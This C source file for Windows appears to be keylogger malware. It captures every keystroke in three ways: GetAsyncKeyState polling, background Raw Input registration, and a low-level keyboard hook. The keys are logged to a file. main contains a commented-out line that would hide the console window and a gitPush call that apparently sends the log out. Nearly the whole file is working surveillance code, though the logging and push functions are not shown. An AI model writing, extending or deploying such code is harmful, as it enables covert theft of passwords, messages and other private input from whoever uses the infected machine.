#include "Header.h"

bool caps = false, numLk = false, scrLk = false;

int main(int argc, char* argv[]) {
	const char fileName[] = "Log.txt";

	caps = GetKeyState(VK_CAPITAL) & 1;
	numLk = GetKeyState(VK_NUMLOCK) & 1;
	scrLk = GetKeyState(VK_SCROLL) & 1;

	//ShowWindow(GetConsoleWindow(), SW_HIDE);

	//KeyLogger_GetAsyncKeyState();
	//KeyLogger_RawInput();	
	//KeyLogger_SetWindowsHook();

	gitPush("12345");
	getchar();
}

void KeyLogger_GetAsyncKeyState() {
	while (1) {
		for (int i = 0; i < 255; i++) {
			int keystate = GetAsyncKeyState(i);
			if (keystate & 1) { // check key toggled
				LogKey(i);
			}

		}
		Sleep(10);
	}
}

LRESULT CALLBACK wndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {

	switch (msg) {
		case WM_CREATE: {
			RAWINPUTDEVICE rid = {};
			rid.dwFlags = RIDEV_EXINPUTSINK;
			rid.hwndTarget = hWnd;
			rid.usUsage = 6; // keyboard
			rid.usUsagePage = 1;

			RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE));
			break;
		}
		case WM_INPUT: {
			RAWINPUT input = {};
			UINT size = sizeof(input);
			if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, &input, &size, sizeof(RAWINPUTHEADER)) == -1) {
				printf("Error getting raw input.");
				break;
			}

			UINT event = input.data.keyboard.Message;
			if (event == WM_KEYDOWN || event == WM_SYSKEYDOWN) {
				LogKey(input.data.keyboard.VKey);
			}
			break;
		}
		default: return DefWindowProc(hWnd, msg, wParam, lParam);
	}
}

void KeyLogger_RawInput() {
	WNDCLASSEX wcx = {};
	wcx.cbSize = sizeof(WNDCLASSEX);
	wcx.lpfnWndProc = wndProc;
	wcx.hInstance = GetModuleHandle(NULL);
	wcx.lpszClassName = "RawInput";
	RegisterClassEx(&wcx);

	HWND hWnd = CreateWindowEx(0, wcx.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

LRESULT CALLBACK hookFunction(int code, WPARAM wParam, LPARAM lParam) {
	if (code == HC_ACTION) {
		PKBDLLHOOKSTRUCT keystroke = (PKBDLLHOOKSTRUCT)lParam;
		if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) {
			LogKey(keystroke->vkCode);
		}
	}
	return CallNextHookEx(NULL, code, wParam, lParam);
}

void KeyLogger_SetWindowsHook() {
	HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, hookFunction, GetModuleHandle(NULL), 0);
	if (!hook) {
		printf("Failed to create hook. Error: %d\n", GetLastError());
		return;
	}

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hook);
}
